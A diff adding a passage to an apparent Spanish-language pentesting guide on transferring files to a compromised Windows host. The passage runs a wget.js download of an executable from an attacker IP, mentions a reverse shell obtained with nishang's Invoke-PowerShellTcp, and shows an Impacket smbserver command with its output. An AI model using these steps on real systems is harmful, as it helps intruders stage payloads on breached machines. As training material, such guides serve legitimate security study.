@@ -1261,3 +1261,20 @@ Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente coma
 ```bash
 cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
 ```
+
+En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque también sirve para consola normal, sólo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.
+
+Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado específico para la compartición de archivos:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/smb]
+└──╼ #impacket-smbserver shared `pwd`
+Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
